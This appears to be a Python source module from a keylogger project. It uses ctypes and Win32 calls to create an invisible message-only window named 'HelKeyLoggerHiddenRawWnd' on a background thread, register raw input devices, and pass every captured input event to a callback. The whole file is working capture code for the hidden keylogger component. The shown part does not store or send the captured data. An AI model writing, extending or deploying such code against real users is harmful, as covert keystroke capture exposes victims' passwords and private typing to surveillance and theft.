# raw_listener.py

import ctypes;
import ctypes.wintypes as wt;
import threading;

from raw_input import WM_INPUT, parse_wm_input, register_default_devices;

user32 = ctypes.WinDLL('user32', use_last_error=True);
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True);

LRESULT = getattr(wt, 'LRESULT', ctypes.c_ssize_t);

CS_HREDRAW = 0x0002;
CS_VREDRAW = 0x0001;

WM_DESTROY = 0x0002;
WM_CLOSE = 0x0010;

HWND_MESSAGE = wt.HWND(-3);

HCURSOR = getattr(wt, 'HCURSOR', wt.HANDLE);
HBRUSH = getattr(wt, 'HBRUSH', wt.HANDLE);

class WNDCLASSW(ctypes.Structure):
    _fields_ = [
        ('style', wt.UINT),
        ('lpfnWndProc', ctypes.c_void_p),
        ('cbClsExtra', wt.INT),
        ('cbWndExtra', wt.INT),
        ('hInstance', wt.HINSTANCE),
        ('hIcon', wt.HICON),
        ('hCursor', HCURSOR),
        ('hbrBackground', HBRUSH),
        ('lpszMenuName', wt.LPCWSTR),
        ('lpszClassName', wt.LPCWSTR),
    ];

RegisterClassW = user32.RegisterClassW;
RegisterClassW.argtypes = (ctypes.POINTER(WNDCLASSW),);
RegisterClassW.restype = wt.ATOM;

UnregisterClassW = user32.UnregisterClassW;
UnregisterClassW.argtypes = (wt.LPCWSTR, wt.HINSTANCE);
UnregisterClassW.restype = wt.BOOL;

CreateWindowExW = user32.CreateWindowExW;
CreateWindowExW.argtypes = (wt.DWORD, wt.LPCWSTR, wt.LPCWSTR, wt.DWORD, wt.INT, wt.INT, wt.INT, wt.INT, wt.HWND, wt.HMENU, wt.HINSTANCE, wt.LPVOID);
CreateWindowExW.restype = wt.HWND;

DestroyWindow = user32.DestroyWindow;
DestroyWindow.argtypes = (wt.HWND,);
DestroyWindow.restype = wt.BOOL;

DefWindowProcW = user32.DefWindowProcW;
DefWindowProcW.argtypes = (wt.HWND, wt.UINT, wt.WPARAM, wt.LPARAM);
DefWindowProcW.restype = LRESULT;

GetMessageW = user32.GetMessageW;
GetMessageW.argtypes = (ctypes.POINTER(wt.MSG), wt.HWND, wt.UINT, wt.UINT);
GetMessageW.restype = wt.BOOL;

TranslateMessage = user32.TranslateMessage;
TranslateMessage.argtypes = (ctypes.POINTER(wt.MSG),);
TranslateMessage.restype = wt.BOOL;

DispatchMessageW = user32.DispatchMessageW;
DispatchMessageW.argtypes = (ctypes.POINTER(wt.MSG),);
DispatchMessageW.restype = LRESULT;

PostMessageW = user32.PostMessageW;
PostMessageW.argtypes = (wt.HWND, wt.UINT, wt.WPARAM, wt.LPARAM);
PostMessageW.restype = wt.BOOL;

GetModuleHandleW = kernel32.GetModuleHandleW;
GetModuleHandleW.argtypes = (wt.LPCWSTR,);
GetModuleHandleW.restype = wt.HMODULE;

class RawInputListener:
    def __init__(self, on_event):
        self._on_event = on_event;
        self._thread = None;
        self._hwnd = None;
        self._class_name = 'HelKeyLoggerHiddenRawWnd';

    def start(self):
        if self._thread is not None:
            return;
        self._thread = threading.Thread(target=self._run, daemon=True);
        self._thread.start();

    def stop(self):
        if self._hwnd:
            PostMessageW(self._hwnd, WM_CLOSE, 0, 0);

    def _run(self):
        hinst = GetModuleHandleW(None);

        WNDPROCTYPE = ctypes.WINFUNCTYPE(LRESULT, wt.HWND, wt.UINT, wt.WPARAM, wt.LPARAM);

        def wndproc(hwnd, msg, wparam, lparam):
            if msg == WM_INPUT:
                ev = parse_wm_input(lparam);
                if ev is not None:
                    try:
                        self._on_event(ev);
                    except Exception:
                        pass;
                return 0;
            if msg == WM_CLOSE:
                DestroyWindow(hwnd);
                return 0;
            if msg == WM_DESTROY:
                user32.PostQuitMessage(0);
                return 0;
            return DefWindowProcW(hwnd, msg, wparam, lparam);

        self._wndproc = WNDPROCTYPE(wndproc);

        wc = WNDCLASSW();
        wc.style = CS_HREDRAW | CS_VREDRAW;
        wc.lpfnWndProc = ctypes.cast(self._wndproc, ctypes.c_void_p);
        wc.cbClsExtra = 0;
        wc.cbWndExtra = 0;
        wc.hInstance = hinst;
        wc.hIcon = None;
        wc.hCursor = None;
        wc.hbrBackground = None;
        wc.lpszMenuName = None;
        wc.lpszClassName = self._class_name;

        atom = RegisterClassW(ctypes.byref(wc));
        if not atom:
            return;

        hwnd = CreateWindowExW(0, self._class_name, self._class_name, 0, 0, 0, 0, 0, HWND_MESSAGE, None, hinst, None);
        if not hwnd:
            UnregisterClassW(self._class_name, hinst);
            return;

        self._hwnd = hwnd;

        register_default_devices(hwnd);

        msg = wt.MSG();
        while True:
            r = GetMessageW(ctypes.byref(msg), None, 0, 0);
            if r == 0:
                break;
            if r == -1:
                break;
            TranslateMessage(ctypes.byref(msg));
            DispatchMessageW(ctypes.byref(msg));

        self._hwnd = None;
        UnregisterClassW(self._class_name, hinst);